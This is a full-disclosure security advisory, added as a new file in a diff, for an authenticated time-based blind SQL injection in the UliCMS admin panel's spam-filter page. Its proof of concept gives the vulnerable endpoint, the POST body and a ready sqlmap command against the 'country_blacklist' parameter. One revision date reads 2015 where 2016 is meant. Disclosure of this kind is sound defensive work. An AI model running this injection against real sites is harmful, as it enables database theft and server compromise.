@@ -1,0 +1,87 @@
+=============================================
+MGC ALERT 2016-001
+- Original release date: January 26, 2016
+- Last revised:  February 02, 2016
+- Discovered by: Manuel García Cárdenas
+- Severity: 7,1/10 (CVSS Base Score)
+=============================================
+
+I. VULNERABILITY
+-------------------------
+Time-based SQL Injection in Admin panel UliCMS <= v9.8.1
+
+II. BACKGROUND
+-------------------------
+UliCMS is a modern web content management solution from Germany, that
+attempts to make web content management more easier.
+
+III. DESCRIPTION
+-------------------------
+This bug was found using the portal with authentication as administrator.
+To exploit the vulnerability only is needed use the version 1.0 of the HTTP
+protocol to interact with the application.
+
+It is possible to inject SQL code in the variable "country_blacklist" on
+the page "action=spam_filter".
+
+IV. PROOF OF CONCEPT
+-------------------------
+The following URL's and parameters have been confirmed to all suffer from
+Time Based Blind SQL injection.
+
+/ulicms/admin/?action=spam_filter
+
+(POST)
+spamfilter_enabled=yes&spamfilter_words_blacklist=a&country_blacklist=ru&submit_spamfilter_settings=Save+Changes
+
+POC using SQLMap:
+
+sqlmap -u "http://127.0.0.1/ulicms/admin/?action=spam_filter" --cookie="SET
+COOKIE HERE"
+--data="spamfilter_enabled=yes&spamfilter_words_blacklist=a&country_blacklist=ru&submit_spamfilter_settings=Save+Changes"
+-p "country_blacklist" --dbms="mysql" --dbs
+
+V. BUSINESS IMPACT
+-------------------------
+Public defacement, confidential data leakage, and database server
+compromise can result from these attacks. Client systems can also be
+targeted, and complete compromise of these client systems is also possible.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+UliCMS <= v9.8.1
+
+VII. SOLUTION
+-------------------------
+Install vendor patch.
+
+VIII. REFERENCES
+-------------------------
+http://en.ulicms.de/
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered and reported
+by Manuel García Cárdenas (advidsec (at) gmail (dot) com).
+
+X. REVISION HISTORY
+-------------------------
+January 26, 2016 1: Initial release
+February 02, 2015 2: Revision to send to lists
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+January 26, 2016 1: Vulnerability acquired by Manuel Garcia Cardenas
+January 26, 2016 2: Send to vendor
+January 28, 2016 3: Vendor fix vulnerability
+February 02, 2016 4: Send to the Full-Disclosure lists
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+
+XIII. ABOUT
+-------------------------
+Manuel Garcia Cardenas
+Pentester
